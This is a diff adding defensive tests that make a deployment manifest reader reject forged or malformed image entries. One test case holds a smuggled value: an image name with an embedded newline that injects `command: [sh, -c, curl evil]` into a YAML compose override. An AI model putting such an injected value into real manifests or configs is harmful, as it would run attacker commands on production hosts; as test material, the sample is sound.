@@ -89,6 +89,79 @@ describe('reading the manifest', () => {
     });
 });
 
+describe('a manifest is untrusted input', () => {
+    /**
+     * It arrives as a downloaded artefact and decides what a production host
+     * starts. The interesting attacks are not exotic — they are a file that
+     * looks right, and each of these is one.
+     */
+    const refuses = (over: Record<string, unknown>, fragment: string) => {
+        expect(() => withFile(manifest(over), file => consumer.readManifest(file)))
+            .toThrow(fragment);
+    };
+
+    it('refuses a version it was not written for', () => {
+        // Version 1 named tags; version 2 names digests. Reading a version-1
+        // file with version-2 rules would pin nothing and report success.
+        refuses({ version: 1 }, 'is not 2');
+        refuses({ version: undefined }, 'is not 2');
+        refuses({ version: '2' }, 'is not 2');
+    });
+
+    it('refuses a repository that is not ours', () => {
+        // A perfectly valid digest of somebody else's image. This is the check
+        // a digest cannot make for itself.
+        refuses({ images: { ...manifest().images,
+            api: { tag: 'ghcr.io/someone-else/parallext-api:candidate-' + SHA, digest: digest('1') } },
+        }, 'not one of');
+    });
+
+    it('refuses a tag that does not name this commit', () => {
+        // The tag is discarded when the override is written, and it still has
+        // to be right: a manifest whose tag disagrees with its own commit was
+        // produced by something that is not the candidate workflow.
+        refuses({ images: { ...manifest().images,
+            api: { tag: 'ghcr.io/nipko/parallext-api:latest', digest: digest('1') } },
+        }, 'is tagged');
+        refuses({ images: { ...manifest().images,
+            api: { tag: 'ghcr.io/nipko/parallext-api:candidate-' + 'b'.repeat(40), digest: digest('1') } },
+        }, 'is tagged');
+    });
+
+    it('refuses a value that could break out of the YAML line', () => {
+        // The override is YAML written by hand. A newline ends the line and
+        // starts a new key, so a crafted value could add a `command:` or a
+        // `volumes:` entry to a service. Refused rather than sanitised:
+        // sanitising would silently change what the host runs.
+        for (const hostile of [
+            'ghcr.io/nipko/parallext-api' + String.fromCharCode(10)
+                + '    command: [sh, -c, curl evil]',
+            'ghcr.io/nipko/parallext-api # comment',
+            'ghcr.io/nipko/parallext-api with space',
+            "ghcr.io/nipko/parallext-api'",
+        ]) {
+            refuses({ images: { ...manifest().images,
+                api: { tag: hostile + ':candidate-' + SHA, digest: digest('1') } },
+            }, 'cannot appear');
+        }
+    });
+
+    it('refuses a URL where an image reference belongs', () => {
+        refuses({ images: { ...manifest().images,
+            api: { tag: 'https://ghcr.io/nipko/parallext-api:candidate-' + SHA, digest: digest('1') } },
+        }, 'looks like a URL');
+    });
+
+    it('still accepts the manifest the workflow actually writes', () => {
+        // The control. Every refusal above is worthless if the real shape is
+        // refused too, and this is the shape `candidate.yml` emits.
+        const parsed = withFile(manifest(), file => consumer.readManifest(file));
+        expect(parsed.version).toBe(2);
+        expect(Object.keys(parsed.images).sort())
+            .toEqual(['api', 'dashboard', 'landing', 'whatsapp', 'worker']);
+    });
+});
+
 describe('the compose override it writes', () => {
     it('names every service by digest and nothing by tag', () => {
         const parsed = withFile(manifest(), file => consumer.readManifest(file));
